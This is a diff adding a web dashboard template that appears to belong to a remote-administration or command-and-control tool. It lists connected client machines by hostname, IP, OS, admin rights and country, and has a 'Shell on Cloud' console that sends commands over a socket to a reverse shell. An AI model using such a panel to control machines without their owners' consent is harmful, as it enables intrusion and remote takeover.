@@ -1,0 +1,242 @@
+
+<div class="row">
+  <div class="col-sm-12 clientListingHeader">
+    <h2 style="margin:0px 0px 0px 0px;">Clients</h2>
+  </div>
+</div>
+<div class="row">
+  <div class="col-sm-12 clientListing">
+
+    <table width="100%" border="1" align="center" id="table_clients">
+      <thead>
+        <th>ID</th>
+        <th>ONLINE</th>
+        <th>USERNAME</th>
+        <th>IP ADRESS</th>
+        <th>OS</th>
+        <th>VERSION</th>
+        <th>ADMINISTRATOR</th>
+        <th>COUNTRY</th>
+      </thead>
+      <tbody>
+      <% clients.forEach(function(client){ %>
+            <tr>
+              <td>
+                <%= client.client_id %>
+              </td>
+              <td style="text-align:center;">
+                <img src="img/icons/offline.png" class="iconOnline" id='client_<%= client.client_id %>'>
+              </td>
+              <td>
+                <a href="../client_dashboard/<%= client.client_id %>"><%= client.client_hostname %></a>
+              </td>
+              <td>
+                <%= client.client_ip %>
+              </td>
+              <td>
+                <%= client.client_os %> (<%= client.client_os_version %>)
+              </td>
+              <td>
+                <%= client.client_version %>
+              </td>
+              <td style="text-align:center;">
+                <img src="img/icons/offline.png" class="iconOnline">
+              </td>
+              <td>
+                <%= client.client_country %>
+              </td>
+            </tr>
+      <% }); %>
+    </tbody>
+    </table>
+
+    <button class="form-control btn-block btn-success" data-toggle="collapse" data-target="#addClosedClient"><span class="glyphLeft glyphicon glyphicon-plus"></span> Ajouter un client (closed mode only)</button>
+
+  </div>
+
+</div>
+
+<div class="row defaultContainer collapse" id="addClosedClient" style="margin-bottom:20px;">
+  <form class="" action="" method="post">
+    <div class="col-sm-2">
+        <h4>Serial: </h4>
+    </div>
+    <div class="col-sm-4">
+        <input type="text" name="serial" value="" class="form-control">
+    </div>
+    <div class="col-sm-2">
+        <h4>key: </h4>
+    </div>
+    <div class="col-sm-4">
+        <input type="text" name="key" value="" class="form-control">
+    </div>
+    <div class="col-md-12">
+      <br>
+      <input type="submit" class="form-control btn-success" name="" value="Add a new client (only in closed mode)">
+    </div>
+  </form>
+</div>
+
+<div class="row">
+  <div class="col-sm-12 consoleLogsHeader">
+    <h2 style="margin:0px 0px 0px 0px;float:left;" id="titleLogs">Live socket</h2>
+    <div style="float:right;">
+      <button type="button" name="button" class="btn btn-info" id="btnLiveSocket">Live socket</button>
+      <button type="button" name="button" class="btn btn-info" id="btnShellCloud">Shell on Cloud</button>
+      <button type="button" name="button" class="btn btn-info" id="btnWebLogs">Web Logs</button>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="col-sm-12 consoleLogs">
+
+    <div id="container-liveLogClient"  class="liveLogs">
+      <div id="liveLogClient">
+
+      </div>
+    </div>
+
+    <div id="container-shellCloud"  class="liveLogs">
+      <pre id="shellCloud" class="remoteShell"></pre>
+      <input type="text" name="" value="" class="form-control cmdForReverseShellCloud" placeholder="Enter command here and press enter :)" style="background:#000;color:#2ecc71;border:1px solid #3498db;">
+    </div>
+
+    <div id="container-tableLogsWeb" class="liveLogs" style="">
+      <table width="100%" border="1" align="center" id="table_logs">
+        <thead>
+          <th>ID</th>
+          <th>Date/Time:</th>
+          <th>IP:</th>
+          <th>Type:</th>
+          <th>Origin:</th>
+          <th>Url:</th>
+          <th>Data:</th>
+        </thead>
+        <tbody>
+        <% logs.forEach(function(log){ %>
+              <tr>
+                <td>
+                  <%= log.log_id%>
+                </td>
+                <td>
+                  <%= log.log_datetime.getFullYear() %>-<%= log.log_datetime.getMonth() %>-<%= log.log_datetime.getDay() %> <%= log.log_datetime.getHours() %>:<%= log.log_datetime.getMinutes() %>:<%= log.log_datetime.getSeconds() %>
+                </td>
+                <td>
+                  <%= log.log_ip%>
+                </td>
+                <td>
+                  <%= log.log_type%>
+                </td>
+                <td>
+                  <%= log.log_origin%>
+                </td>
+                <td>
+                  <%= log.log_text%>
+                </td>
+                <td style='width:15%;'>
+                  <%= log.log_data%>
+                </td>
+              </tr>
+        <% }); %>
+      </tbody>
+      </table>
+
+    </div>
+
+  </div>
+</div>
+
+<script>
+
+  function init_client_listing(socket, data){
+
+    // Get online client on pagination change
+    $(".paginate_button").live("click", function() {
+      socket.emit('getNodeClientOnline');
+    });
+
+    // Log live client
+    socket.on('liveLogClient', function (text, type) {
+      var dateTime = new Date();
+     $("#liveLogClient").prepend("["+dateTime + "] <span class='logs-"+type+"' style='color:black;padding:5px;'>"+text+"</span><br>");
+    });
+
+    // Send cmd to reverse shell for cloud
+    $(".cmdForReverseShellCloud").keypress(function(e) {
+        if(e.which == 13) {
+          var cmd = $(".cmdForReverseShellCloud").val();
+          socket.emit("cmdForReverseShellCloud", cmd);
+          $(".cmdForReverseShellCloud").val("");
+        }
+    });
+
+    // Callback reverse shell cloud
+    socket.on('reverseShellCallbackCloud', function (data, type) {
+      if(type == "success") var logType = "logs-info";
+      if(type == "error")   var logType = "logs-danger";
+      $("#shellCloud").append("<p class='logs-warning'>=======================================</p>");
+      $("#shellCloud").append("<p class='"+logType+"'>"+data+"</p>");
+      $('#shellCloud').scrollTop($('#shellCloud')[0].scrollHeight);
+    });
+
+    /* ---------- FRONTEND ---------- */
+
+    $.slidebars({
+    siteClose: true, // true or false
+    disableOver: false, // integer or false
+    hideControlClasses: false, // true or false
+    scrollLock: true // true or false
+    });
+
+    // DataTbale client
+    $('#table_clients').DataTable({
+    "responsive": true,
+    "scrollX": true,
+    "pageLength": 10,
+    "order": [[ 0, "desc" ]],
+    /*"language": {
+        "url": "https://cdn.datatables.net/plug-ins/1.10.13/i18n/French.json"
+    }*/
+    });
+
+    // DataTbale logs
+    $('#table_logs').DataTable({
+    "responsive": true,
+    "scrollX": true,
+    "pageLength": 5,
+    "order": [[ 0, "desc" ]],
+    /*"language": {
+        "url": "https://cdn.datatables.net/plug-ins/1.10.13/i18n/French.json"
+    }*/
+    });
+
+    $("#container-tableLogsWeb").hide();
+    $("#container-shellCloud").hide();
+
+    $("#btnLiveSocket").click(function() {
+      $("#container-liveLogClient").show();
+      $("#container-shellCloud").hide();
+      $("#container-tableLogsWeb").hide();
+      $("#titleLogs").html("Live socket");
+    });
+
+    $("#btnShellCloud").click(function() {
+      $("#container-liveLogClient").hide();
+      $("#container-shellCloud").show();
+      $("#container-tableLogsWeb").hide();
+      $("#titleLogs").html("Shell on Cloud");
+    });
+
+    $("#btnWebLogs").click(function() {
+      $("#container-liveLogClient").hide();
+      $("#container-shellCloud").hide();
+      $("#container-tableLogsWeb").show();
+      $("#titleLogs").html("Web Logs");
+    });
+
+    //$(".DataTables_scrollBody").niceScroll({cursorcolor:"#3498db"});
+    $(".remoteShell").niceScroll({cursorcolor:"#3498db"});
+
+  }
+
+</script>
